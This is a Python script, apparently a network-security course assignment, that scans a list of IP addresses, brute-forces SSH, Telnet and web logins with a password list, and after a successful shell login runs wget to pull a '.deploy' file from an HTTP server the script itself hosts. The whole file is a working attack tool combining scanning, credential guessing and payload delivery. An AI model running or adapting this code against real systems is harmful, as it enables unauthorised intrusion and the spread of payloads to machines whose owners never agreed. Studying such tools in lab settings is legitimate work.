#!/usr/bin/python3

from scapy.all import *
from os import path
from shutil import copyfile, rmtree
from telnetlib import Telnet
from paramiko import SSHClient, AutoAddPolicy
from requests import get, post
from http.server import HTTPServer, SimpleHTTPRequestHandler

conf.verb = 0


def main():
    arguments = sys.argv[1:]
    number_of_arguments = len(arguments)
    if number_of_arguments < 8 or "-t" not in arguments or "-p" not in arguments or "-u" not in arguments or "-f" not in arguments:
        help()

    ip_file = arguments[arguments.index("-t") + 1]
    verify_file_exists(ip_file)

    ip_list = read_ip_list(ip_file)
    print("[+] Determining which IP addresses are reachable...")
    ip_list = [ip for ip in ip_list if is_reachable(ip)]
    if not ip_list:
        print("[!] No reachable IP addresses found from the provided list")
        exit()

    ports = arguments[arguments.index("-p") + 1]
    port_list = get_ports_from_input(ports)

    username = arguments[arguments.index("-u") + 1]
    password_file = arguments[arguments.index("-f") + 1]
    verify_file_exists(password_file)
    password_list = get_passwords(password_file)

    if "-d" in arguments:
        deployment_file = arguments[arguments.index("-d") + 1]
        deploy_file_to_server(deployment_file)
    print("[+] Received %d response(s). Beginning attack!\n" % len(ip_list))
    for ip in ip_list:
        print("********** %s **********" % ip)
        for port in port_list:
            port_open = scan_port(ip, port)
            print("Port %d is %s on %s" % (port, "open" if port_open else "closed", ip))
            if port_open:
                bruteforce_function = {
                    22: bruteforce_ssh,
                    23: bruteforce_telnet,
                    80: bruteforce_web,
                    8080: bruteforce_web,
                    8888: bruteforce_web
                }[port]

                response = bruteforce_function(ip, port, username, password_list)
                if response:
                    print("Successfully logged into port %d with %s" % (port, response))

        print("********** %s **********\n" % ip)


def scan_port(ip, port):
    pkt = IP(dst=ip) / TCP(dport=port, flags="S")
    ans, unans = sr(pkt, timeout=2)
    if len(ans) > 0:
        return "S" in str(ans[0][1][TCP].flags)
    else:
        return False


def bruteforce_telnet(ip, port, username, passwords):
    response = ""
    server_number = int(ip.split(".")[3])

    login_prompt = encode_in_ascii("login:")
    username_input = encode_in_ascii("%s\n" % username)
    password_prompt = encode_in_ascii("Password:")
    welcome_output = encode_in_ascii("Welcome to")

    cd_command = encode_in_ascii("cd /home/ubuntu/assign_2\n")
    pwd_command = encode_in_ascii("pwd\n")
    pwd_output = encode_in_ascii("assign_2$")
    wget_command = encode_in_ascii("wget 10.0.0.1:54325/.deploy\n")

    for password in passwords:
        connection = Telnet(ip, port=port)
        connection.read_until(login_prompt)
        connection.write(username_input)
        connection.read_until(password_prompt)
        connection.write(encode_in_ascii("%s\n" % password))
        banner = connection.read_until(welcome_output, timeout=1)
        if welcome_output in banner:
            # connection.write(cd_command)
            # output = connection.read_until(pwd_output, timeout=1)
            connection.write(wget_command)
            connection.close()
            # print(output)
            # print(connection.read_all())
            response = "%s:%s" % (username, password.rstrip())
            break

        connection.close()

    return response


def bruteforce_ssh(ip, port, username, passwords):
    response = ""
    server_number = int(ip.split(".")[3])
    cd_command = "cd /home/%s/assign_2/server_%d\n" % (username, server_number)
    wget_command = "wget 10.0.0.1:54325/.deploy\n"
    ls_la_command = "ls -la\n"
    exit_command = "exit\n"
    for password in passwords:
        try:
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.connect(ip, username=username, password=password, port=port)

            channel = client.invoke_shell()
            stdin = channel.makefile('wb')
            stdout = channel.makefile('rb')

            stdin.write('''%s %s %s %s''' % (cd_command, wget_command, ls_la_command, exit_command))
            print(stdout.read())
            response = "%s:%s" % (username, password.rstrip())
            break
        except Exception:
            pass
        finally:
            client.close()

    return response


def bruteforce_web(ip, port, username, passwords):
    response = ""
    base_url = "http://%s:%d" % (ip, port)
    index_url = "%s/index.php" % base_url
    login_url = "%s/login.php" % base_url
    for password in passwords:
        index_response = get(index_url)
        if index_response.status_code == 200:
            login_response = post(login_url, data={"username": username, "password": password})
            if "Welcome" in login_response.text:
                response = "%s:%s" % (username, password)

    return response


def read_ip_list(ip_file):
    ip_list = []
    with open(ip_file) as reader:
        ip_list = reader.read().splitlines()

    return ip_list


def get_passwords(password_file):
    password_list = []
    with open(password_file) as reader:
        password_list = reader.read().splitlines()

    return password_list


def is_reachable(ip):
    ans = sr1(IP(dst=ip, ttl=64) / ICMP(), timeout=2)
    return ans is not None


def deploy_file_to_server(file):
    current_directory = os.getcwd()
    current_file_location = "%s/%s" % (current_directory, file)
    temp_directory = "%s/net_attack_deployment" % current_directory
    file_name = ".deploy"

    if path.isdir(temp_directory):
        rmtree(temp_directory)

    os.mkdir(temp_directory)
    os.chdir(temp_directory)
    copyfile(current_file_location, file_name)

    server = ("", 54325)
    http = HTTPServer(server, SimpleHTTPRequestHandler)

    http_server_thread = threading.Thread(target=http.serve_forever, name="HTTP Server Thread")
    http_server_thread.daemon = True
    http_server_thread.start()


def get_ports_from_input(ports_input):
    ports = []
    ports_input_split = ports_input.split(",")
    for port in ports_input_split:
        if port.isdigit():
            ports.append(int(port))

    return ports


def verify_file_exists(file):
    if not path.isfile(file):
        print("Could not find file %s" % file)
        exit()


def encode_in_ascii(s):
    return s.encode("ascii")


def help():
    print("Example usage: ./net_attack.py -t my_ip_list.txt -p 22,23,25,80 -u admin -f my_password_list.txt")
    exit()


if __name__ == "__main__":
    main()
